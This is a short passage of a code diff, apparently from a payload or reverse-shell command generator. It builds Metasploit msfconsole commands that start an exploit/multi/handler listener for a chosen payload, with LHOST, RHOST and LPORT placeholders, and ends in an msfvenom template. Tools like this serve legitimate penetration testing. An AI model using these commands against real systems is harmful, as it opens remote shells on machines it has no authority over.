+        ? `msfconsole -q -x "use exploit/multi/handler; set payload ${payload}; set RHOST {{RHOST}}; set LPORT {{LPORT}}; run"`
+        : `msfconsole -q -x "use exploit/multi/handler; set payload ${payload}; set LHOST {{LHOST}}; set LPORT {{LPORT}}; run -j"`;
 
     const combinedTemplate = `# msfvenom
 ${msfvenomTemplate}
